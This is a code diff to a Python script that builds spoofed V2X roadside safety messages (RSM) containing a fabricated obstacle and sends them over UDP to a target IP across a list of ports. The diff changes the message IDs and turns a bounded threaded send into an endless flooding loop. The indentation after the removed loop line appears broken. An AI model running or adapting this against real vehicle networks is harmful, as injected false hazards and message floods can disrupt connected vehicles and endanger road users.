@@ -12,7 +12,7 @@ def build_attack_message():
     ltevCoder = asn1tools.compile_files(asnPath, 'uper', numeric_enums=True)
 
     rsm_message = RSM_MsgFrame()
-    id = str(200)
+    id = str(10086)
     rsm_message['id'] = '{:0>8}'.format(id)
 
     earth_radius = 6371004
@@ -24,7 +24,7 @@ def build_attack_message():
     rsm_message['refPos']['elevation'] = 0
 
     objets = [{}]
-    objets[0]['id'] = 200
+    objets[0]['id'] = 10086
     objets[0]['position'] = (2000, 2000, 0)
     objets[0]["orientation"] = (0, 0, 0)
     objets[0]["speed"] = 0
@@ -90,15 +90,9 @@ if __name__ == '__main__':
             port = line.strip()
             ip_tables.append(int(port))
 
-    threads = []
-    for i in range(1000):
+    
         attack_message = build_attack_message()
-        for port in ip_tables:
-            attack_address = (target_ip, port)
-            thread = threading.Thread(target=send_packet, args=(udp_socket, attack_message, attack_address))
-            threads.append(thread)
-            thread.start()
-
-    # 等待所有线程完成
-    for thread in threads:
-        thread.join()
+        while(True):
+            for port in ip_tables:
+                attack_address = (target_ip, port)
+                send_packet(udp_socket, attack_message, attack_address)
